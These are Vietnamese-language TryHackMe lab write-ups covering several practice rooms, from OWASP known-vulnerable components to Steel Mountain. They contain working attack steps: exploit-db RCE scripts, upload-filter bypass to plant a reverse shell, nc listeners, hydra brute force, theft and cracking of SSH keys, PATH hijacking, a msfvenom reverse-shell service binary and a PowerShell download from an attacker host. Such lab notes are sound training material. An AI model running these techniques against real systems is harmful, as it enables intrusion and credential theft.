# Complete Beginner
## Owasp Top 10
### Components with known vulnerabilities - Lab
- Link: https://tryhackme.com/room/owasptop10
- Cho trước 1 trang web 

    Ảnh: https://drive.google.com/file/d/1opL40MC6VXSkpeHjo-0Vsb3QrI03uBju/view

- Yêu cầu: Khai thác lỗ hổng RCE để thực hiện Execute Shell "wc -c /etc/passwd".
- Biết trước ứng dụng sử dụng PHP, MySQL, Boostrap.
- Dùng nmap quét cổng 80 hoặc truy cập URL không tồn tại, dễ dàng phát hiện ứng dụng chạy HTTP Server: Apache/2.4.29 (Ubuntu).
- Cách tiếp cận: Sử dụng searchsploit hoặc search trên exploit-db lần lượt  các thông tin liên quan như PHP, MySQL, Boostrap, CSE (tên ứng dụng).
- Kết quả tìm kiếm cho thấy PHP, MySQL, Boostrap (không có version) không có kết quả khả quan.
- Thực hiện search từ khóa CSE (filter PHP, webapps) trên exploit-db: Tìm được 3 lỗ hổng: Multiple SQLi; XSS; Authentication Bypass. Tuy cả 3 đều có exploit script nhưng có vẻ đều không phải lỗ hổng cần tìm. Suy luận: SQLi có thể dump được version MySQL, từ đó có thể khai thác triệt để hơn (nếu có lỗ hổng). Tuy nhiên có vẻ cách tiếp cận này không quá tốt => đặt ở mức ưu tiên thấp.
- Chuyển sang cách tiếp cận khác: Search tên webapp cụ thể trên bằng searchsploit hoặc exploit-db với từ khóa: Online Book Store.
- Thực thi: searchsploit "Online Book Store". Nhận được 6 kết quả, trong đó có Unauthenticate Remote Code Execution (có exploit script chạy bằng python đặt ở php/webapps/47887.py). Nhận ra đây có thể là hướng tiếp cận đúng. 
- Thực thi: searchsploit -m 47887 để copy exploit script về local machine. Sau khi chạy xong, file exploit được copy về /home/admin/47887.py
- Thực thi: python3 /home/admin/47887.py [URL] (ex. python3 /home/admin/47887.py http://10.10.25.43). Ngay lập tức khai thác được RCE.
- Thực thi bất kì câu lệnh shell nào để kiểm tra chắc chắn có RCE như id, ls,...
- Sau khi chắc chắn đã khai thác được RCE, thực hiện wc -c /etc/passwd. Kết quả trả ra 1611. Đó là kết quả cần tìm.
- Đề bài CTF này nằm ở mức tiếp cận cho Newbie. Tuy không khó nhưng đáng để thử sức sau thời gian đầu tìm hiểu infosec. Happy hacking! 

## Upload Vulnerabilities
### Challenge
- OK Let's go!
- Nhìn qua trang web `jewel.uploadvulns.thm` thì thấy trang chủ có chức năng upload file (cụ thể là image).
- Nhìn qua 1 lượt page source, thấy link đến 1 file static javascript đáng ngờ có tên `upload.js`. Check source file `upload.js`, nhận thấy đây là file chứa phần file upload filter (client-side) => Có thể bypass bằng burpsuite.
- Dùng gobuster để enum: `gobuster dir -u jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 250 --no-error` cho kết quả: 
    * /modules              (Status: 301) [Size: 181] [--> /modules/]
    * /admin                (Status: 200) [Size: 1238]
    * /assets               (Status: 301) [Size: 179] [--> /assets/]
    * /Content              (Status: 301) [Size: 181] [--> /Content/]
    * /Assets               (Status: 301) [Size: 179] [--> /Assets/]
    * /Modules              (Status: 301) [Size: 181] [--> /Modules/]
    * /Admin                (Status: 200) [Size: 1238]
 - Nhận thấy /admin và /Admin có thể là một (có cùng size) và có status 200 => truy cập được. 
 - Truy cập /admin, ok đây là nơi để thực thi file (từ thư mục /modules).
 - Dùng gobuster để enum /modules nhưng không cho kết quả gì khả quan.
 - Dùng gobuster để enum /content với file được cho sẵn từ đề bài: `gobuster dir -u jewel.uploadvulns.thm/content -w ~/Downloads/UploadVulnsWordlist.txt -x jpg -t 250 --no-error` cho kết quả: 
    * /ABH.jpg              (Status: 200) [Size: 705442]
    * /LKQ.jpg              (Status: 200) [Size: 444808]
    * /SAD.jpg              (Status: 200) [Size: 247159]
    * /UAD.jpg              (Status: 200) [Size: 342033]
- Truy cập thử các file kia trên url, nhận thấy đây là các ảnh được chiếu làm background trang chủ.
- Trang chủ có ghi: `Have you got a nice image of a gem or a jewel?  
Upload it here and we'll add it to the slides!`. Dự đoán ảnh upload sẽ được đưa vào thư mục /content và được sửa tên thành định dạng ***.jpg.
- Upload 1 file đúng định dạng jpg hoặc jpeg lên thành công và dùng gobuster enum lại thư mục /content sẽ thấy file đã được đẩy lên với tên có dạng ***.jpg. 
- Dùng Wappalyzer để thấy trang web sử dụng Express làm framework Back-end, nền tảng NodeJs. Dùng msfvenom để gen reverse shell payload hoặc lấy 1 payload NodeJs bất kỳ. Upload file js đó lên thử, tất nhiên sẽ bị từ chối.
- Lúc này dùng Burpsuite để chặn response của request file upload.js. Sau đó xóa bỏ đoạn code filter để bypass client-side filter.
- Upload file đúng jpg vừa thành công lúc nãy, nhưng lần này để đuôi là jpg11, nhận được thông báo lỗi => Back-end filter theo whitelist.
- Upload lại file js thì được thông báo lỗi sai định dạng file => js không nằm trong whitelist.
- Sửa tên file payload thành định dạng jpg (hoặc dữ nguyên tên file, chỉnh sửa request bằng burpsuite), sau đó upload, nhận được thông báo thành công => đã bypass được server-side filter => payload đã nằm trên target. Việc bây giờ cần làm là tìm cách chạy payload đó trên server.
- Ta đã biết file sau khi được upload sẽ nằm trong thư mục content với định dạng ***.jpg => Dùng gobuster enum thư mục /content thêm lần nữa để tìm ra tên đúng của file vừa upload.
- Dùng gobuster enum /content cho kết quả:
    * /ABH.jpg              (Status: 200) [Size: 705442]
    * /LIP.jpg              (Status: 200) [Size: 383]
    * /LKQ.jpg              (Status: 200) [Size: 444808]
    * /SAD.jpg              (Status: 200) [Size: 247159]
    * /UAD.jpg              (Status: 200) [Size: 342033]
    * /ZBE.jpg		    (Status: 200) [Size: 250178]
- So với lần enum /content đầu tiên, ta có thêm 2 file khác: LIP.jpg và ZBE.jpg. Dự đoán: 1 trong 2 file này là payload js ta tải lên.
- Mở listener ở local sẵn: `nc -lnvp 4444`
- Truy cập http://jewel.uploadvulns.thm/content/ZBE.jpg cho kết quả là ảnh jpg thật mà ta upload trước đó.
- Truy cập http://jewel.uploadvulns.thm/content/LIP.jpg nhận được 1 thông báo lỗi display file => Dự đoán: Đó là file payload mà ta đã upload. Vì nội dung payload là code js nên không thể hiển thị dưới dạng jpg là đương nhiên.
- Truy cập http://jewel.uploadvulns.thm/admin để thực thi file. Ở đây có mô tả sẽ thực thi file từ thư mục /modules. Mà /modules và /content (nơi chứa payload) nằm cùng cấp => file cần thực thi từ /modules sẽ là ../content/LIP.jpg.
- Sau khi thực thi file ../content/LIP.jpg, ngay lập tức port 4444 tại local nhận được kết nối từ server để thực hiện shell. Tìm đến ../flag.txt để nhận flag.
- Lưu ý tên các file trên server là ngẫu nhiên.
- Happy Hacking!

## Basic Computer Exploitation
### Vulnversity
- Recon: Nmap
- Enum web-dir: gobuster
- Tìm được thư mục upload, trang upload file. Tại form upload, bị block định dạng `.php`. Xem page source xác định không có client-side filter, block do server-side. Thử 1 vài định dạng khác của php (có thể dùng burp suite intruder để brute force), phát hiện định dạng `.phtml` có thể bypass. Upload payload  reverse shell php -> RCE -> gain access.
- Tìm được flag 1 trong /home/bill/user.txt.
- PrivEsc: dùng LinEnum.sh để enum -> tìm thấy SUID file có thể khai thác: `/bin/systemctl`. Khai thác theo GTFOBins không thành công, khai thác theo [PrivEsc: Systemctl](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) thành công -> gain root privilege. Lấy flag tại /root/root.txt.
- Happy Hacking!

### Basic Pentesting
- Recon: nmap
- Enum web-dir: gobuster
- Enum SMB: enum4linux -> nhận được 2 username: jan; kay.
- Brute force ssh jan: hydra
- Gain access -> lấy id_rsa của kay trong /home/kay/.ssh/id_rsa
- Dùng john để crack passphrase: `ssh2john id_rsa > file.txt`; `john --wordlists=/usr/share/wordlists/rockyou.txt file.txt`.
- Có được passphrase -> ssh vào kay.
- Trong /home/kay/pass.bak có chứa password của kay. Dùng nó để lấy quyền sudo. -> Privesc!
- Happy Hacking!

### Kenobi
- Recon: Nmap -> chạy Samba và ProFTPD, ssh, rpcbind.
- Enum Samba shares bằng Nmap NSE -> có 1 share: /anonymous, truy cập bằng smbclient, tải về tệp log.txt chứa thông tin về thông tin khi ssh key-gen và thông tin version ProFPTD bằng smbget. Tiếp tục dùng Nmap NSE để scan port rpcbind để showmount trên server: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP`.
- ProFPTD có CVE. Exploit theo CVE đó. Mount local machine với target. Truy cập vào FTP, exploit theo CVE, copy file id_rsa (theo đường dẫn lấy được trong log.txt) về local machine. SSH vào target theo user kenobi (có được từ log.txt) và id_rsa.
- Privesc: tìm SUID binary: `find / -type f -perm -u=s 2>/dev/null`. Phát hiện file /usr/bin/menu có vẻ lạ lạ. Chạy /usr/bin/menu, hiện ra 3 lựa chọn "status check; kernel version; ifconfig" và cho phép nhập số để chọn 1 trong 3. Dùng `strings /usr/bin/menu` để list ra các string có thể đọc được. Trong đó có 3 dòng cần chú ý 
![enter image description here](https://i.imgur.com/toHFALv.png)
Đây là các lệnh chạy tương ứng với 3 options "status check; kernel version; ifconfig". Nhận thấy các lệnh này được gọi không phải bằng đường dẫn tuyệt đối (/usr/bin/curl thay vì curl, tương tự với 2 lệnh kia), ta có thể khai thác để Privesc với Path Variable Manipulation. Tạo file có tên curl trong /tmp với nội dung /bin/sh `touch /tmp/curl; echo "/bin/sh > /tmp/curl"`. Thay  đổi mode của file vừa tạo `chmod 777 /tmp/curl` (hoặc `chmod +x /tmp/curl`). Thay đổi biến người dùng PATH, trỏ đến /tmp để khi dùng curl, linux sẽ tìm đến /tmp và chạy /tmp/curl thay vì /usr/bin/curl (mạo danh curl thật) `export PATH=/tmp:$PATH`. Chạy lại /usr/bin/menu và chọn options 1, ta sẽ nhận được 1 root shell. Privesc thành công.
- Happy Hacking!

### Steel Mountain
- Recon: Nmap.
- Để ý có port 8080 chạy HTTP proxy. Truy cập vào thì thấy 1 trang quản lý file, sử dụng Rejetto HTTP File Server (Có CVE). Dùng metasploit exploit theo lỗ hổng đó -> gain initial access.
- Privesc: 
	* Để enum, ta sẽ sử dụng tập lệnh powershell có tên là PowerUp, mục đích là để đánh giá máy Windows và xác định bất kỳ sự bất thường nào - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations._". [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
	* Download PowerUp từ Github về local, upload lên target thông qua meterpreter: `upload <path-to-file-local>`. Load powershell vào meterpreter: `load powershell`. Chạy powershell từ meterpreter: `powershell_shell`. Thực thi PowerUp.ps1: `. .\PowerUp.ps1` và chạy Invoke-AllChecks để enum: `Invoke-Allhecks`.
	* Chú ý đến tùy chọn CanRestart được đặt thành true. Tên của service hiển thị dưới dạng lỗ hổng unquoted service path là AdvancedSystemCareService9. Tùy chọn CanRestart là true, cho phép ta khởi động lại một dịch vụ trên hệ thống, thư mục của ứng dụng cũng có thể ghi được. Điều này có nghĩa là chúng ta có thể thay thế ứng dụng gốc bằng ứng dụng độc hại của ta, khởi động lại service, service này sẽ chạy chương trình độc hại mà ta thay thế! 
	* Chạy `get-service` để xem các service. Chú ý đến service AdvancedSystemCareService9 ở trạng thái running. Ta cần stop service đó trước khi upload ứng dụng độc hại lên để thay thế. Chạy `Stop-Service -Name "Advanced SystemCare Service 9"` để stop service đó.Use msfvenom to generate a reverse shell as an Windows executable: `msfvenom -p windows/shell_reverse_tcp LHOST=<Local-IP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe` (tên output phải giống với tên ứng dụng được chạy bởi service). Thoát khởi powershell, quay lại meterpreter, dùng cd để chuyển đến path chạy service: C:\Program Files (x86)\IObit\Advanced SystemCare. Upload lên target qua meterpreter: `upload <path-to-ASCService-local>`. Mở listener ở local port 4443: `nc -lnvp 4443`. Quay trở lại powershell, start service để chạy ứng dụng độc hại vừa upload: `Start-Service -Name "Advanced SystemCare Service 9"`. Lúc này ở port 4443 local sẽ nhận được 1 root shell. Privesc!
	* Final flag ở C:\Users\Administrator\Desktop\root.txt.
- Access and Escalation without Metasploit:
	* Searchsploit và exploit theo CVE. Để gain access cần 2 bước. Bước 1 download netcat binary, đồng thời dùng python mở 1 web server từ local tại nơi chứa netcat binary. Đồng thời chỉnh sửa IP và port trong file exploit thành IP local và port của http server local. Run exploit để đưa netcat binary vào target. Bước 2 chỉnh sửa port trong file exploit thành port reverse shell (ví dụ 4444). Đồng thời mở listener port tại local (ví dụ 4444). Run exploit để nhận được reverse shell. -> gain initial access.
	* Privesc: Download WinPEAS.exe về local, mở http server. Tại target, chạy `powershell -c "wget http://<Local-IP>:<Local-HTTP-Port>/winPEASx86_ofs.exe -OutFile C:\Users\bill\Desktop\WinPEAS.exe"` để đưa WinPEAS đến target. Dùng cd đến `C:\Users\bill\Desktop` và chạy WinPEAS bằng `powershell -c ". .\WinPEAS.exe"`. Sau khi Enum thành công, chú ý đến khu vực `Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths`. Ở đó có service AdvancedSystemCareService9 có lỗ hổng unquoted path. Khai thác giống như cách dùng metasploit (lưu ý chạy command theo format `powershell -c "command here"` để chạy trên powershelll). Ở bước upload ASCService.exe, ta dùng python http server ở local và wget ở target (thay vì upload như metasploit). Các bước còn lại chạy tương tự như cách dùng metasploit. -> Privesc!
- Happy Hacking!
